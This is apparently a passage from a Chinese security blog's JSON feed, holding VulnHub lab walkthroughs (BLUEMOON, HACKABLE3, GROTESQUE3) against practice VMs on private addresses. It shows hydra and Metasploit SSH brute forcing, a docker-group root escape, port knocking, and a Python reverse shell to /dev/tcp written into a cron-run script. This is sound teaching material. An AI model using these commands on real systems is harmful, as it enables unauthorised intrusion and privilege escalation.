alt=\"Image\">\n<p>对比下面两个网站发现一模一样没有任何区别</p>\n<blockquote>\n<p>猜测从 22 到 600 这么多页面基本上都是一模一样的，唯有一个不同，而那个不同的页面需要通过脚本或者其他的方式筛选出来，可以用 burp 的方式访问不同端口的网站，看返回的数据包的长度来找，也可以用 wget 批量下载页面，</p>\n</blockquote>\n<p>下载所有文件 <code>for i in &#123;23..600&#125;;do wget 192.168.31.73:$i -O index$i;done</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-897.png\" width=\"520\" alt=\"Image\">\n<p>查看文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-898.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"linux-排序文件\"><a class=\"markdownIt-Anchor\" href=\"#linux-排序文件\">#</a> linux 排序文件</h3>\n<p>对下载到的文件进行排序  <code>ls -Al | sort | awk '&#123;print $5,$9&#125;' | tail -n10</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-899.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 看到在 258 端口处的网站有不一样的返回结果</p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNzM6MjU4Lw==\">http://192.168.31.73:258/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-900.png\" width=\"660\" alt=\"Image\">\n<p>给出提示，ssh 的用户名可能是如下这几个</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-901.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"智力游戏解密\"><a class=\"markdownIt-Anchor\" href=\"#智力游戏解密\">#</a> 智力游戏解密</h3>\n<p>审查源代码发现了一个图片的地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-902.png\" width=\"590\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNzM6MjU4L2Vtb2ppL2hhbmQucG5n\">http://192.168.31.73:258/emoji/hand.png</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-903.png\" width=\"520\" alt=\"Image\">\n<p>大致一看是没有什么特殊的，但是仔细看图片后，发现隐藏着一些敏感信息，在图片的中间有一串 hash 数据： <code>b6e705ea1249e2bb7b0fd7dac9fcd1b3</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-904.png\" width=\"520\" alt=\"Image\">\n<p>解密此 md5 加密，得到密码为 solomon1</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-905.png\" width=\"520\" alt=\"Image\">\n<p>到此已经收集到了几个可能的用户名和一个 ssh 密码</p>\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> hydra 爆破 ssh</h3>\n<p><code>hydra -L user.txt -p solomon1 ssh://192.168.31.22 -t 4</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-906.png\" width=\"650\" alt=\"Image\">\n<p>得到一组 ssh 的登陆凭据 angel:solomon1  <code>ssh angel@192.168.31.73</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-907.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"pspy-监控\"><a class=\"markdownIt-Anchor\" href=\"#pspy-监控\">#</a> pspy 监控</h3>\n<p>上传 pspy 监控看有没有被定时执行的任务</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-908.png\" width=\"560\" alt=\"Image\">\n<p>两个脚本定时执行，由于权限不足不能查看这两个脚本的作用，只能进行猜测，搜索目录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-909.png\" width=\"700\" alt=\"Image\">\n<blockquote>\n<p>发现有一个 quiet 的文件夹里边有很多文件，而所有的文件中的内容都是 quiet 的内容，需要把这个文件先删除，然后查看此文件夹下的内容是否增加  <code>cat * | uniq</code>   <code>rm -rf *</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-910.png\" width=\"320\" alt=\"Image\">\n<p><code>watch -n1 ls</code>  监控文件状态</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-911.png\" width=\"620\" alt=\"Image\">\n<p>经过一段时间之后发现 quiet 文件又都复原了，判断出来 write 就是些 quiet 文件的，check 就是用来检查 quiet 文件是否存在的，上传 linpeas 检查是否有更多的敏感信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-912.png\" width=\"700\" alt=\"Image\">\n<p>找到了一个 /rootcreds.txt 文件，文件里有 root 的账户和密码， <code>su root</code>  切换到 root 的账户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-913.png\" width=\"320\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n<h3 id=\"定时任务查看\"><a class=\"markdownIt-Anchor\" href=\"#定时任务查看\">#</a> 定时任务查看</h3>\n<p>定时任务中就是在不断的执行这两个脚本</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-914.png\" width=\"420\" alt=\"Image\">\n<p>check 的作用就是检查文件夹中的内容是否为空是的话就把 root 的密码写到根目录下，write 的作用是遍历写 quiet</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-915.png\" width=\"320\" alt=\"Image\">\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/128%20BLUEMOON/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/128%20BLUEMOON/",
            "title": "VULNHUB 28 BLUEMOON",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmx1ZW1vb24tMjAyMSw2Nzkv\">https://www.vulnhub.com/entry/bluemoon-2021,679/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ZDViN2YyZDIwZTQ=\">https://www.jianshu.com/p/5d5b7f2d20e4</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 BLUEMOON：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-sacn -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-702.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.153</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p 192.168.0.153</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-703.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21,22,80</p>\n<h3 id=\"ftp-弱口令\"><a class=\"markdownIt-Anchor\" href=\"#ftp-弱口令\">#</a> FTP 弱口令</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTM=\">http://192.168.0.153</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-704.png\" width=\"440\" alt=\"Image\">\n<p>查看源代码，发现一个图片的地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-705.png\" width=\"650\" alt=\"Image\">\n<p>看样子是一个蓝色的月球，但是这个图片没什么作用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-706.png\" width=\"650\" alt=\"Image\">\n<p>先尝试从 ftp 进行突破 <code>ftp 192.168.0.153</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-707.png\" width=\"370\" alt=\"Image\">\n<p>尝试弱口令登陆失败，接下来对 80 网站进行目录扫描</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>可以使用各种工具扫描，扫描结果可能因为字典的不同而得到不同的结果，这里我用 dirmap 和 gobuster 两者都扫描了一次</p>\n<p><code>python3 dirmap.py -i http://192.168.0.153 -lcf</code> <br>\n <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.0.153</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-708.png\" width=\"650\" alt=\"Image\">\n<p>dirmap 默认的字典并不是很全，如果需要有更准确的信息，需要换字典</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-709.png\" width=\"650\" alt=\"Image\">\n<p>用 dirbuster 中的 directory 字典扫出来了一个目录：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTMvaGlkZGVuX3RleHQ=\">http://192.168.0.153/hidden_text</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-710.png\" width=\"570\" alt=\"Image\">\n<p>查看源代码，看能否有更多的发现，找到了一个隐藏的图片</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-711.png\" width=\"430\" alt=\"Image\">\n<p>访问得到了一个 url 地址: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTMvLlFSX0MwZDMucG5n\">http://192.168.0.153/.QR_C0d3.png</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-712.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"linux-识别二维码\"><a class=\"markdownIt-Anchor\" href=\"#linux-识别二维码\">#</a> linux 识别二维码</h3>\n<p>用 linux 来识别这个二维码，看能否从这个二维码中得到更多可靠的信息</p>\n<p>下载到 kali 机器上，并修改文件名字为 qr.png:  <code>wget http://192.168.0.153/.QR_C0d3.png -O qr.png</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-713.png\" width=\"520\" alt=\"Image\">\n<p>Linux 下可以用 zbarimg 来识别二维码<br>\n <code>zbarimg x.png</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-714.png\" width=\"400\" alt=\"Image\">\n<p>-&gt; 找到了 ftp 的账户和密码 ftp:ftpp@ssword</p>\n<h3 id=\"ftp-信息收集\"><a class=\"markdownIt-Anchor\" href=\"#ftp-信息收集\">#</a> FTP 信息收集</h3>\n<p>登陆到 ftp 服务器查看存在 ftp 中的有哪些文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-715.png\" width=\"480\" alt=\"Image\">\n<p>将 ftp 服务中的资料下载到本地查看内容</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-716.png\" width=\"480\" alt=\"Image\">\n<p>-&gt; Infromation 中的内容如下，透露出来一个用户名 robin，并且他的密码强度弱 p_lists.txt 为一些密码，很显然需要通过 hydra 爆破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-717.png\" width=\"520\" alt=\"Image\">\n<p>用 robin 作为用户名，p_lists 做为密码进行爆破 ssh，得到了密码<br>\n <code>hydra -l robin -P p_lists.txt ssh://192.168.0.153 -f -t 4 -I -vV -o hydra.ssh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-718.png\" width=\"700\" alt=\"Image\">\n<p>通过 ssh 命令成功登陆到了靶机中<br>\n <code>ssh 192.168.0.153 -l robin</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-719.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"docker-提权\"><a class=\"markdownIt-Anchor\" href=\"#docker-提权\">#</a> docker 提权</h3>\n<p><code>sudo -l</code>  查看有无权限设置错误</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-720.png\" width=\"520\" alt=\"Image\">\n<p>发现可以以 jerry 的身份执行这个脚本  <code>sudo -u jerry /home/robin/project/feedback.sh</code> <br>\n 执行后，输入两个 bash，拿到了 jerry 的权限</p>\n<p>用 python3 调整为一个比较美观的终端: <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-721.png\" width=\"450\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行<span class=\"built_in\">id</span>的时候发现属于docker组，尝试用docker提权</span></span><br><span class=\"line\">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">调整shell输出比较美观的shell</span></span><br><span class=\"line\">SHELL=/bin/bash script -q /dev/null</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-722.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/135%20HACKABLE3/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/135%20HACKABLE3/",
            "title": "VULNHUB 35 HACKABLE3",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWlpLDcyMC8=\">https://www.vulnhub.com/entry/hackable-iii,720/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDEwNzgzNi9hcnRpY2xlL2RldGFpbHMvMTE5NDExNDc1\">https://blog.csdn.net/weixin_44107836/article/details/119411475</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 HACKABLE3：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>识别同一网卡下的 ip 地址，并且过滤出提前已知的 MAC 地址，打印出所 有的机器的 ip 地址并扫描其端口，最后删除多余文件<br>\n <code>sudo arp-scan -l &gt; 1.txt ; cat 1.txt | grep 'a0' &gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk '&#123;print$1&#125;' &gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-916.png\">\n<p>-&gt; 靶机 ip：192.168.31.47 靶机开放端口 80 (22 被过滤)</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNDcv\">http://192.168.31.47/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-917.png\" width=\"520\" alt=\"Image\">\n<p>查看网页源码，提示需要尝试上次日记中使用过的端口碰撞技术来解锁</p>\n<p>ssh 端口，并且告诉老板 approve.jpg，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1oYWNrYWJsZTMtdTc1bjFnd2o4MDBiMjJpOWlhcTM1Y2luMGE1ZzhhLmNvbQ==\">并且有一个公司域名 hackable3.com</span>，此外还有一个用户名 jubiscleudo。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-918.png\">\n<p>修改本地 hosts 文件，将 hackable3.com 解析到靶机 ip，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1oYWNrYWJsZTMtOXExcnE2MGEuY29t\">打开 hackable3.com</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-919.png\" width=\"520\" alt=\"Image\">\n<p>目录扫描  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.47</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-920.png\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vbG9naW4ucGhw\">http://hackable3.com/login.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-921.png\" width=\"700\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vMy5qcGc=\">http://hackable3.com/3.jpg</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-922.png\" width=\"600\" alt=\"Image\">\n<p>这个 url 地址就很奇怪</p>\n<h3 id=\"steghide-图片隐写\"><a class=\"markdownIt-Anchor\" href=\"#steghide-图片隐写\">#</a> Steghide 图片隐写</h3>\n<p>此图片下载下来进行解析一番<br>\n <code>wget [http://hackable3.com/3.jpg -q</code> <br>\n <code>steghide extract -sf 3.jpg</code></p>\n<blockquote>\n<p>这里使用了文件隐写，Steghide 是一款开源的隐写术软件，它可以让你在一张图片或者音频文件中隐藏你的秘密信息，而且不会注意到图片或音频文件发生了任何的改变。而且，你的秘密文件已经隐藏在了原始图片或音频文件之中了。</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-923.png\" width=\"480\" alt=\"Image\">\n<p>爆出了一个 65535 的端口，猜测是需要端口敲门的一个端口号</p>\n<h3 id=\"有效目录筛选\"><a class=\"markdownIt-Anchor\" href=\"#有效目录筛选\">#</a> 有效目录筛选</h3>\n<p>继续访问其他的 url 地址: <span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vMi50eHQ=\">http://hackable3.com/2.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-924.png\" width=\"520\" alt=\"Image\">\n<p>找到了 2.txt 这个文件，有 brainfuck 加密的一段密文，用在线网址进行解密</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-925.png\" width=\"520\" alt=\"Image\">\n<p>发现了第二个数字 4444，继续对未搜寻的目标网址进行信息收集</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLzEudHh0\">http://hackable3.com/config/1.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-926.png\" width=\"440\" alt=\"Image\">\n<p>找到了 1.txt，直接通过终端进行 base64 解密，找到了第三个数字 10000</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-927.png\" width=\"310\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLnBocA==\">http://hackable3.com/config.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-928.png\" width=\"550\" alt=\"Image\">\n<p>找到了一些数据库的配置信息，但是没有利用价值</p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vYmFja3VwL3dvcmRsaXN0LnR4dA==\">http://hackable3.com/backup/wordlist.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-929.png\" width=\"470\" alt=\"Image\">\n<p>找到一个可能是密码的一个清单</p>\n<p>至此信息收集工作完毕，简单总结一下我们收集到的信息</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20v\">http://hackable3.com/</span>--&gt; 疑似用户名 jubiscleudo<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vYmFja3VwL3dvcmRsaXN0LnR4dA==\">http://hackable3.com/backup/wordlist.txt</span> --&gt; 疑似密码清单<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vY29uZmlnLzEudHh0\"> http://hackable3.com/config/1.txt</span> --&gt; 10000<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vY3NzLzIudHh0\">http://hackable3.com/css/2.txt</span> --&gt; 4444<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2hhY2thYmxlMy5jb20vMy5qcGc=\">http://hackable3.com/3.jpg</span> --&gt; steghide extract -sf 3.jpg --&gt; 65535</p>\n<h3 id=\"shell脚本端口敲门\"><a class=\"markdownIt-Anchor\" href=\"#shell脚本端口敲门\">#</a> shell 脚本端口敲门</h3>\n<blockquote>\n<p>knockd 服务：即敲门端口服务，该服务通过动态的添加 iptables 规则来隐藏系统开启的服务，使用自定义的一系列序列号来 “敲门”，使系统开启需要访问的服务端口，才能对外访问，不使用时，再使用自定义序列号来 “关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性，它的默认配置文件是： <code>/etc/knockd.conf</code></p>\n</blockquote>\n<p>再次检查 22 端口确定是被过滤掉的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-930.png\" width=\"470\" alt=\"Image\">\n<p>尝试用 nmap 依次去访问信息搜集出来的三个端口进行端口敲门<br>\n <code>sudo nmap -p 4444,10000,65535 -A 192.168.31.223</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-931.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 端口敲门失败了，可能是防火墙规则有一定的限制，比如两个端口之间的敲门间隔，两个端口之间的敲门顺序等</p>\n<p>利用 shell 命令进行批量端口敲门<br>\n <code>for i in 10000,4444,65535;do sudo nmap -p $i 192.168.31.48;done</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-932.png\" width=\"440\" alt=\"Image\">\n<p>这种方法依次对三个端口进行敲门，不分前后顺序，所以敲门依旧失败了，将逗号去掉，依次对三个端口进行敲门<br>\n <code>for i in 10000 4444 65535;do sudo nmap -p $i 192.168.31.48;done</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-933.png\" width=\"440\" alt=\"Image\">\n<p>端口敲门成功后，就可以用字典进行爆破 ssh 协议了</p>\n<h3 id=\"hydra或msf-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra或msf-爆破-ssh\">#</a> hydra 或 msf 爆破 ssh</h3>\n<p>用户名就用我们信息收集阶段收集到的敏感用户名 jubiscleudo，密码选取在网站上看到的疑似密码的文件<br>\n <code>wget http://hackable3.com/backup/wordlist.txt -O passwd.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-934.png\" width=\"440\" alt=\"Image\">\n<p>使用 hydra 尝试 ssh 的爆破<br>\n <code>hydra -l jubiscleudo -P wordlist.txt ssh://192.168.31.48 -t 4 -f -I -vV -o hydra.ssh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-935.png\" width=\"700\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-936.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 爆破成功，拿到了 jubiscleudo 用户的密码为 onlymy</p>\n<p>也可以用 msfconsole 进行 ssh 的爆破</p>\n<blockquote>\n<p>使用 msfconsole 的方法设置参数，如使用 ssh_login 的模块，设置攻击 ip，爆破成功后的行为，线程，日志，密码清单，密码用户等；可以通过 options 选项查看该设置哪些参数</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">msfconsole</span></span><br><span class=\"line\">use scanner/ssh/ssh_login</span><br><span class=\"line\">set rhosts 192.168.31.48</span><br><span class=\"line\">set STOP_ON_SUCCESS yes</span><br><span class=\"line\">set THREADS 4</span><br><span class=\"line\">set VERBOSE true</span><br><span class=\"line\">set PASS_FILE /home/parallels/Desktop/tool/hackable3/wordlist.txt</span><br><span class=\"line\">set USERNAME jubiscleudo</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-937.png\" width=\"700\" alt=\"Image\">\n<p>设置好参数之后通过 run 命令开始执行 payload</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-938.png\" width=\"430\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-939.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 爆破成功之后爆出来了用户名和密码 jubiscleudo:onlymy</p>\n<h3 id=\"数据库备份文件泄露\"><a class=\"markdownIt-Anchor\" href=\"#数据库备份文件泄露\">#</a> 数据库备份文件泄露</h3>\n<p>登陆服务器  <code>ssh 192.168.31.48 -l jubiscleudo</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-940.png\" width=\"450\" alt=\"Image\">\n<p>对服务器的版本，SUID，pkexec，id 组，sudo，cron 检测后没有发现敏感文件，寻找服务器上是否有敏感的遗留文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-941.png\" width=\"480\" alt=\"Image\">\n<p>在网站主目录下找到一个备份文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-942.png\" width=\"480\" alt=\"Image\">\n<p>在此文件中看到了数据库的用户名和密码</p>\n<p>-&gt; (‘DB_USERNAME’, ‘hackable_3’);<br>\n-&gt; (‘DB_PASSWORD’, ‘TrOLLED_3’);</p>\n<p>mysql 尝试登录此数据库</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-943.png\" width=\"480\" alt=\"Image\">\n<p>用 mysql 尝试登陆时却登陆失败了，那么这个用户名的意义何在？<br>\n查看一下此系统中存在哪些用户，发现就是有一个 hackable_3 的用户，直接切换到 hackable_3 用户成功</p>\n<h3 id=\"定时任务提权\"><a class=\"markdownIt-Anchor\" href=\"#定时任务提权\">#</a> 定时任务提权</h3>\n<p>看到 id 组属于 lxd，可以 lxd 提权，</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-944.png\" width=\"700\" alt=\"Image\">\n<p>这里我们用其他方式提权，给靶机上下载一个 pspy64 s 的监控，看定时任务</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-945.png\" width=\"520\" alt=\"Image\">\n<p>靶机上接受到 pspy64s 后，配置可执行权限开始跑程序</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-946.png\" width=\"700\" alt=\"Image\">\n<p>有一个 python 脚本定时被执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-947.png\" width=\"600\" alt=\"Image\">\n<p>尝试查看次文件时失败了，直接通过 cat 写反弹 shell 的脚本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; /scripts/to_hackable_3.py &lt;&lt; EOF</span><br><span class=\"line\">import os</span><br><span class=\"line\">os.system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.73/4444 0&gt;&amp;1&#x27; &quot;)</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-948.png\" width=\"440\" alt=\"Image\">\n<p>监听端口，等待 shell 反弹</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-949.png\" width=\"550\" alt=\"Image\">\n<p>-&gt; py 被执行后，成功拿到 root 权限</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/133%20GROTESQUE3/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/133%20GROTESQUE3/",
            "title": "VULNHUB 33 GROTESQUE3",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTMwMSw3MjMv\">https://www.vulnhub.com/entry/grotesque-301,723/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 GROTESQUE3：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-scan -l &gt; 1.txt ; cat 1.txt | grep 'a0' ; rm -f 1.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-866.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.63</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.63</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-867.png\" width=\"470\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==\">http://192.168.31.102/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-868.png\" width=\"520\" alt=\"Image\">\n<p>这里有一个地址，点击这个地址会跳转到一个页面</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNjMvYXRsYXNnLmpwZw==\">http://192.168.31.63/atlasg.jpg</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-869.png\" width=\"520\" alt=\"Image\">\n<p>提示指向了这个图片，看来这个图片有一些线索，仔细查看这个图片</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-870.png\" width=\"520\" alt=\"Image\">\n<p>图片中的一部分有这么一张小图片，有 MD 还有 5 个 X，很显然是 md5<br>\n 那么这个 md5 加密有什么可以利用的地方吗？可能会是目录采用的 md5 加密，可能是某个特殊的文件地址的前缀是 md5 的字符串</p>\n<h3 id=\"linux-下-md5-加密\"><a class=\"markdownIt-Anchor\" href=\"#linux-下-md5-加密\">#</a> linux 下 md5 加密</h3>\n<blockquote>\n<p>终端里边进行 md5 加密和解密分别为如下操作<br>\n echo “xxx” | 